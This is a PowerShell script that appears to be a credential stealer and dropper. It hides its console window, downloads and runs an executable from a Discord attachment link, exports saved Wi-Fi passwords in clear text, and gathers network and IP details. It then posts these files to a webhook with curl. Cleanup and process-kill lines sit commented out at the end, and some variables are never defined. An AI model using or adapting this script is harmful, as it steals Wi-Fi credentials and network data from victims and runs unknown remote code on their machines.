Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)     

Invoke-WebRequest 'https://cdn.discordapp.com/attachments/975173196103966800/1435755657705029790/fun.exe?ex=690d1f27&is=690bcda7&hm=b2aad148ae82f9f7533f919ccdbe006c76d041af5dab43587d910bf9de9d3466&' -OutFile "$env:LOCALAPPDATA\Temp\fun.exe" ; "$env:LOCALAPPDATA\Temp\fun.exe"

$e = "$env:LOCALAPPDATA\Temp"

# Scrape the localappdata for password files (zipping as an example)
$zip = "$env:TEMP\funny_stuff_folder.zip"

netsh wlan export profile key=clear folder=$e | Out-Null

# Collect WiFi SSIDs and Passwords
$wifiFile = "$e\wifi.txt"
Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
    $x = [xml](Get-Content $_)
    $ssid = $x.WLANProfile.SSIDConfig.SSID.name
    $pass = $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial
    "SSID:$ssid | Password:$pass" | Out-File -Append -FilePath $wifiFile
}


$netInfoFile = Join-Path $e "netinfo.txt"

Get-NetAdapter | ForEach-Object {
    $i = $_
    $ips = Get-NetIPAddress -InterfaceIndex $i.ifIndex -ErrorAction SilentlyContinue
    [pscustomobject]@{
        Name = $i.Name
        Type = $i.InterfaceDescription
        MAC  = $i.MacAddress
        IPv4 = ($ips | Where-Object AddressFamily -eq IPv4 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
        IPv6 = ($ips | Where-Object AddressFamily -eq IPv6 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
    }
} | Format-Table -AutoSize | Out-File $netInfoFile


ipconfig /all | Out-File "$e\ipcfg.txt"



# Send to discord

$content = "$($whoami_content) | @everyone"

Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt, $netInfoFile"

Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt, $netInfoFile"

curl.exe -X POST $wh `
    -F "content=$content" `
    -F "file1=@$zip" `
    -F "file2=@$wifiFile" `
    -F "file3=@$e\ipcfg.txt" `
    -F "file4=@$netInfoFile"

Write-Output sent to discord
# cleanup
#cls
#Remove-Item -Path "$wifiFile" -Force
#Remove-Item -Path "$e\ipcfg.txt" -Force
#Remove-Item -Path "$zip" -Force
#Remove-Item -Path "$netInfoFile" -Force

#exit quickly
#taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
